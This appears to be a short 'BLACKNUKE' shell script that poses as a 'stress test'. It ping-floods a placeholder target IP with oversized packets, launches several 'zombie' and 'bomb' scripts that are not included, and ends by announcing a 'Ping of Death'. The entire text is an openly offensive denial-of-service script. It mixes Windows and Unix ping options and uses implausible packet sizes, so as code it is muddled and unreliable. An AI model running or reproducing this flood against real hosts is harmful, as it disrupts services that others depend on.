echo Copyright © 2010-2017 MODEHAX.CF
echo BLACKNUKE 1.0 Detected
echo Welcome!
echo Starting stress test...

ping -s 9599 -i 9599 $YOURIP$
ping $YOURIP$ -t -l 65550

echo Starting zombies and bombs
cd zombies
sh zombie1.sh
sh zombie2.sh
sh zombie3.sh
sh zombie4.sh
sh bomb1.sh
sh bomb2.sh
sh bomb3.sh
sh bomb4.sh
ping $YOURIP$ -t -l 65550
echo Ping of Death achieved



